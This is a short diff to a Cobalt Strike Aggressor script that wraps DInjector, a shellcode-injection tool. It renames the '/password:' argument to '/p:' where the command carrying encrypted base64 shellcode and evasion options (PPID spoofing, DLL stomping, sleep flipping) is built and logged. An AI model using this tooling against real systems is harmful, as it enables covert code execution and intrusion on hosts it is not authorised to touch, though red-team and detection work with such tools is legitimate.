@@ -54,7 +54,7 @@ sub dinject {
     $cmd .= " /sc:" . base64_encode($enc_shellcode);
 
     # Construct the rest of the DInjector command
-    $cmd .= " /password:$pass";
+    $cmd .= " /p:$pass";
     $cmd .= " /protect:"     . %options["protect"];
     $cmd .= " /timeout:"     . %options["timeout"];
     $cmd .= " /flipSleep:"   . %options["flipSleep"];
@@ -82,7 +82,7 @@ sub dinject {
     bexecute_assembly($bid, script_resource("DInjector.exe"), "$cmd");
 
     blog($bid, "\c7Executed command\cF:\cD execute-assembly DInjector.exe "
-         . %options["technique"] . " /sc:<BASE64>" . " /password:$pass" . " /protect:" . %options["protect"]
+         . %options["technique"] . " /sc:<BASE64>" . " /p:$pass" . " /protect:" . %options["protect"]
          . " /timeout:" . %options["timeout"] . " /flipSleep:" . %options["flipSleep"] . " /image:" . %options["image"]
          . " /pid:" . %options["pid"] . " /ppid:" . %options["ppid"] . " /dll:" . %options["dll"]
          . " /stompDll:" . %options["stompDll"] . " /stompExport:" . %options["stompExport"] . " /sleep:" . %options["sleep"]
